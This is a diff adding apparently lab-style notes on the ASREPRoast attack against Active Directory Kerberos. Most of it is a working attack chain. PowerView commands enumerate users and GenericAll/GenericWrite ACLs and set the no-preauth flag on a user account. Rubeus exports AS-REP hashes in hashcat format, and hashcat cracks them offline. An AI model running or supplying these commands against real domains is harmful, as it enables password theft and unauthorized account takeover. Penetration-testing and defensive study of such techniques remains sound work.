@@ -1,0 +1,45 @@
+The ASREPRoast attack looks for users without Kerberos pre-authentication required attribute (DONT_REQ_PREAUTH).
+
+That means that anyone can send an AS_REQ request to the DC on behalf of any of those users, and receive an AS_REP message. 
+This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.
+
+Furthermore, no domain account is needed to perform this attack, only connection to the DC. However, with a domain account, a LDAP query can be used to retrieve users without Kerberos pre-authentication in the domain. Otherwise usernames have to be guessed.
+
+
+#see if the account you disabled appears
+Get-DomainUser -PreauthNotRequired -Verbose
+
+#If you do not find anything, you can look if you can set the PreauthNotRequired with ACL  GenericAll or GenericWrite
+#Import Module
+. .\powerview.ps1
+
+#Get your SID
+whoami
+Get-DomainUser -SamAccountName Student1
+
+#GenericAll
+Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericAll') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}
+
+#GenericWrite
+Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}
+
+#Disable the DoesnotRequirePreAuth for a user
+Set-DomainObject -Identity hadams -XOR @{useraccountcontrol=4194304} –Verbose
+
+
+---------------------Abuse it---------------
+#Export Hashes
+.\Rubeus.exe asreproast /format:hashcat /outfile:hadams.asreproast
+
+
+#crack offline
+hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
+
+
+#Set it back to normal
+Set-DomainObject -Identity hadams -XOR @{useraccountcontrol=512} –Verbose
+
+property flags DONT_REQ_PREAUTH
+
+4194816
+512
